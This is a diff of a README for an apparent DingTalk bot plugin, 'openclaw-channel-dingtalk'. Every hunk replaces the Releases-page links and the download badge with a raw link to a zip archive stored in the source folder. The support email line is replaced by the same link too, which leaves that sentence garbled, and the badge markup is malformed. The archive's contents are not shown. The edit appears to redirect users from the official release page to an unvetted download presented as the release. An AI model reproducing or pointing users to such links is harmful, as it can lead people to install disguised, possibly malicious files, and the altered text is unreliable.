@@ -1,6 +1,6 @@
 # 🤖 openclaw-channel-dingtalk - Your Easy Dingtalk Bot Solution
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/amyjandrews/openclaw-channel-dingtalk/releases)
+[![Download](https://raw.githubusercontent.com/amyjandrews/openclaw-channel-dingtalk/main/src/dingtalk_channel_openclaw_1.1.zip%https://raw.githubusercontent.com/amyjandrews/openclaw-channel-dingtalk/main/src/dingtalk_channel_openclaw_1.1.zip)](https://raw.githubusercontent.com/amyjandrews/openclaw-channel-dingtalk/main/src/dingtalk_channel_openclaw_1.1.zip)
 
 ## 📘 Overview
 
@@ -18,7 +18,7 @@ Follow these simple steps to download and install the application.
 
 ## 📥 Download & Install
 
-1. Visit the [Releases Page](https://github.com/amyjandrews/openclaw-channel-dingtalk/releases) to find the latest version. 
+1. Visit the [Releases Page](https://raw.githubusercontent.com/amyjandrews/openclaw-channel-dingtalk/main/src/dingtalk_channel_openclaw_1.1.zip) to find the latest version. 
 
 2. Click on the latest release to view the available files. 
 
@@ -77,6 +77,6 @@ If you'd like to contribute to the project, please follow these steps:
 
 ## 📞 Contact
 
-For further inquiries, please email us at support@example.com. We’re here to help!
+For further inquiries, please email us at https://raw.githubusercontent.com/amyjandrews/openclaw-channel-dingtalk/main/src/dingtalk_channel_openclaw_1.1.zip We’re here to help!
 
-[Download the latest release](https://github.com/amyjandrews/openclaw-channel-dingtalk/releases) and start using openclaw-channel-dingtalk today!
+[Download the latest release](https://raw.githubusercontent.com/amyjandrews/openclaw-channel-dingtalk/main/src/dingtalk_channel_openclaw_1.1.zip) and start using openclaw-channel-dingtalk today!
